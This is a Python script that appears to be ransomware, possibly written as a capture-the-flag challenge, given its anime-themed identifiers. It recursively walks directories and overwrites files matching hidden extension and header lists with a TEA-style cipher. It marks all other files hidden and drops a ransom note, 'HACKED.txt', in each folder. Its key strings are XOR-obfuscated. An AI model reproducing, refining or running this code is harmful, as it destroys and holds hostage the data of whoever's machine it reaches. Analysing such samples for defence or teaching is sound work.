import struct
import ctypes
import os
k = ctypes.windll.kernel32

def higurashi(when_they_cry):
    oyashiro = (1, 2)
    wtc = when_they_cry[:]
    stringify = True if isinstance(wtc, str) else False
    wtc = bytearray(wtc) if not stringify else bytearray(wtc.encode())
    for pos in range(len(wtc)):
        wtc[pos] ^= oyashiro[pos%len(oyashiro)]
    if stringify:
        return wtc.decode()
    else:
        return bytes(wtc)

PAT_THE_CAT = "$vnfn8!rtv!vig!u`nmgu'"

android =  b"https://www.youtube.com/watch?v=yzpGUxateUg"
yapapapa = b"https://www.youtube.com/watch?v=DN2ylk6AT5w"
liar = 0xff


im_feeling_so_broken = bytes([android[i] ^ yapapapa[-1] for i in range(len(yapapapa))])
key = [0, 0, 0, 0]
for i in range(len(im_feeling_so_broken)):
    key[i%4] = (key[i%4] + im_feeling_so_broken[i]) % liar

def stage1_enc_8(crypt, crown):
    MIO_MIC = ctypes.c_uint32(crypt[0])
    MIC_MIO = ctypes.c_uint32(crypt[1])
    CIO_CIO = ctypes.c_uint32(0)
    CIU_CIO = 0x9e3779b8
    STAGE_ACTOR = 32
    PINAY = 4
    PIYAU = 5
    VERSION_INFO = [0, 0]
    while (STAGE_ACTOR > 0):
        STAGE_ACTOR -= 1
        MIC_MIO.value -= (MIO_MIC.value << PINAY) + crown[2] ^ MIO_MIC.value + CIO_CIO.value ^ (
        MIO_MIC.value >> PIYAU) + crown[3]
        MIO_MIC.value -= (MIC_MIO.value << PINAY) + crown[0] ^ MIC_MIO.value + CIO_CIO.value ^ (
        MIC_MIO.value >> PIYAU) + crown[1]
        CIO_CIO.value -= CIU_CIO
    VERSION_INFO[0] = MIO_MIC.value
    VERSION_INFO[1] = MIC_MIO.value
    return VERSION_INFO

def WAKATTARA(crypt, key):
    crypt+= b"\x00"*( 8 - (len(crypt)%8))
    s = struct.Struct(higurashi("=KH"))
    j = [(i[0], i[1]) for i in s.iter_unpack(crypt)]
    ans = []
    for block in j[0:]:
        clock = stage1_enc_8(block, key)
        ans.append(clock)
    return b"".join(struct.pack(higurashi("=KH"), *i) for i in ans)

ext = (higurashi("/a`vfksn"),
       higurashi("/a`vr"),
       higurashi("/dmcfq"), )
startswith = (
    higurashi(b'ujd"gn`e!kr'),
    higurashi(b'b{cphary'),
    higurashi(b'bn`qrkgkdf-"qpnrdpu{!mg"bcuehpm"hlewrvsk`n'),)
mlen = max(len(i) for i in startswith)
for cur_dir, _, files in os.walk("."):
    for file in files:
        file = os.path.join(cur_dir, file)
        #print(file)
        cip = False
        if file.lower().endswith(ext):
            cip = True
        else:
            try:
                with open(file, higurashi("s`")) as ff:
                    if ff.read(mlen).lower().startswith(startswith):
                        cip = True
            except:
                pass
        if cip:
            with open(file, higurashi("s)c")) as en:
                mem = WAKATTARA(en.read(), key)
                en.seek(0)
                en.write(mem)
        else:
            try:
                if not file.endswith(higurashi("ICBIDF/vyv")):
                    k.SetFileAttributesW(file, 2)
            except:
                pass
    with open(os.path.join(cur_dir, higurashi("ICBIDF/vyv")), higurashi("v")) as f:
        print(higurashi("""XMT"VGSG!J@AJGE.!A`vFksn!Koftquphcm"ggmn`.!`x"Rgbpdv!Mucjw!mse`lhq`vhmo,!Qdle"%3216"um"""),
              higurashi(PAT_THE_CAT),
              higurashi("""`le"vg&nm"rgof!vig!fdas{qvhmo"tvhn"""), file=f)
